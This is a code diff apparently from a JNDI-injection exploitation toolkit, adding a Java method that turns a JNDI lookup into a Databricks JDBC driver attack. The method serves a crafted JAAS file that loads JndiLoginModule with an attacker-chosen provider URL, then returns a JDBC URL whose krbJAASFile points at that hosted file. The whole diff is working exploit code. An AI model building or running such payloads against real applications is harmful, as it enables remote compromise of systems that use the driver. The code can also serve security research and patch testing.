@@ -459,4 +459,28 @@ public abstract class DatabaseController implements Controller {
 
         return props;
     }
+
+    @JNDIMapping("/Databricks/JNDI/{url}")
+    public Properties databricksJNDI(String url) {
+        System.out.println("[Databricks] [JNDI] URL: " + url);
+
+        String jaasName = MiscUtil.getRandStr(8) + ".conf";
+        String jaasContent = "Client {\n" +
+                "  com.sun.security.auth.module.JndiLoginModule required\n" +
+                "  user.provider.url=\"" + url + "\"\n" +
+                "  group.provider.url=\"test\"\n" +
+                "  useFirstPass=true\n" +
+                "  serviceName=\"test\"\n" +
+                "  debug=true;\n" +
+                "};";
+        WebServer.getInstance().serveFile("/" + jaasName, jaasContent.getBytes());
+
+        String jdbcUrl = "jdbc:databricks://127.0.0.1:443;AuthMech=1;principal=test;KrbAuthType=1;httpPath=/;KrbHostFQDN=test;KrbServiceName=test;krbJAASFile=" + Main.config.codebase + jaasName;
+
+        Properties props = new Properties();
+        props.setProperty("driver", "com.databricks.client.jdbc.Driver");
+        props.setProperty("url", jdbcUrl);
+
+        return props;
+    }
 }
